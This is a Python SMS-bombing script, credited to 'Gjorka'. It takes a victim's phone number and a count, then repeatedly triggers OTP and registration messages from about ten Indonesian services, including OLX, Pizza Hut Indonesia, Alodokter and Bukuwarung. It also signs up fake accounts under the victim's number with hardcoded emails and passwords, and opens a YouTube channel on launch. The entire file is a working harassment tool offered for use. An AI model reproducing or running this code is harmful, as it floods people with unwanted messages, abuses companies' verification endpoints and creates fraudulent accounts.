import requests
import json
import random
import os


def subrek():
    os.system("xdg-open https://www.youtube.com/channel/UCYPbh8b8XEsDnYhwmwgjhsg")
    os.system("clear")

def banner():
    print('''  ________     __              __            
 /  _____/    |__| ___________|  | _______   
/   \  ___    |  |/  _ \_  __ \  |/ /\__  \  
\    \_\  \   |  (  <_> )  | \/    <  / __ \_
 \______  /\__|  |\____/|__|  |__|_ \(____  /
        \/\______|                 \/     \/ 
        Script Spam Sms By Gjorka
            ex: 8xxxxxxxxxx
''')


def spam():

    mal = random.choice(["margeng84@gmail.com", "ganzpaling@gmail.com",
                        "tololbet615@gmail.com", "gblkbngt9171@gmail.com", "ammarburhanudinafis@gmail.com"])
    NoMer = input("Phone : ")
    JumLah = int(input("Jumlah : "))
    for i in range(JumLah):
        heading = {"Host": "evermos.com", "accept": "application/json, text/plain, */*", "user-agent": "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "content-type": "application/json;charset=UTF-8",
                   "origin": "https://evermos.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://evermos.com/registration/otp", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        gjorka = json.dumps({"phone": "62"+NoMer})
        req = requests.post(
            "https://evermos.com/api/register/phone-registration", headers=heading, data=gjorka).text
        if "success" in req:
            print(f"[✓] Sukses Spam Evermos")
        else:
            print(f"[❌] Gagal Spam Evermos")
        ol = {"Host": "api-dash.olsera.co.id", "content-length": "337", "accept": "application/json, text/plain, */*", "content-type": "application/json;charset=UTF-8", "sec-ch-ua-mobile": "?0",
              "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36", "sec-ch-ua-platform": "Linux", "origin": "https://dashboard.olsera.co.id", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://dashboard.olsera.co.id/", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
        ol2 = json.dumps({"name": "AmmarExecuted", "email": mal, "password": "@mm4rgans", "phone": "62"+NoMer, "phone_format": NoMer, "name_toko": "", "url_id": "", "business_type_id": "",
                         "service_type_id": 3, "country_id": "ID", "city_id": "", "state_id": "", "pos_resto_mode": 0, "i_agree": "true", "address": "", "id": "null", "tokenMiscall": "", "use_otp_type": 3})
        ol3 = requests.post(
            "https://api-dash.olsera.co.id/api/admin/v1/en/register", headers=ol, data=ol2).text
        if "Registration succes." in ol3:
            print(f"[✓] Sukses Spam Olsera")
        else:
            print(f"[❌] Gagal Spam Olsera")
        ua = {"Host": "auth.sampingan.co", "domain-name": "auth-svc", "app-auth": "Skip", "content-type": "application/json; charset=UTF-8", "user-agent": "okhttp/4.9.1", "accept": "application/vnd.full+json",
              "accept": "application/json", "content-type": "application/vnd.full+json", "content-type": "application/json", "app-version": "2.1.2", "app-platform": "Android"}
        data = json.dumps(
            {"channel": "WA", "country_code": "+62", "phone_number": NoMer})
        req1 = requests.post(
            "https://auth.sampingan.co/v1/otp", data=data, headers=ua).text
        print(f"[✓] Sukses Spam Sampingan")

        tes = requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send", headers={"Accept": "application/json", "X-APP-VERSION-NAME": "3.4.0", "X-APP-VERSION-CODE": "3399", "Content-Type": "application/json; charset=UTF-8", "Host": "api.bukuwarung.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}, json={"action": "LOGIN_OTP", "countryCode": "62", "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d", "method": "WA", "phone": "0"+NoMer}).text
        if "status" in tes:
            print(f"[✓] Sukses Spam Bukuwarung")
        else:
            print(f"[❌] Gagal Spam Bukuwarung")
        shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
        shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"62"+NoMer,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
        shope=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
        if "errors" in shope:
            print (f"[❌] Gagal Spam LummoShop")
        else:
            print (f"[✓] Sukses Spam LummoShop")
        AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+NoMer,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
        if "PENDING" in AmmarGanz:
            print (f"[✓] Sukses Spam Olx")
        else:
            print (f"[❌] Gagal Spam Olx")

        AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
        wkwk=json.dumps({"account":NoMer})
        req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
        if "Too Early" in req:
            print (f"[❌] Gagal Spam Mapclub")
        else:
            print (f"[✓] Sukses Spam Mapclub")

        pizza={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
        pizza2=json.dumps({  "email": "margeng84@gmail.com",  "first_name": "Gengbeng",  "last_name": "WokLay",  "password": "Aldi++\\/67",  "phone": "0"+NoMer,  "birthday": "2000-01-02"})
        pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=pizza,data=pizza2).text
        if "errors" in pizzahut:
            print (f"[❌] Gagal Spam Pizzahut")
        else:
            print (f"[✓] Sukses Spam Pizzahut")

        xen6={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
        xen7=json.dumps({"user": {"phone": "0"+NoMer}})
        req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text
        if "Kami telah mengirim kode verifikasi. Masukkan kode tersebut untuk verifikasi." in req3:
            print (f"[✓] Sukses Spam Alodokter")
        else:
            print (f"[❌] Gagal Spam Alodokter")


subrek()
banner()
spam()
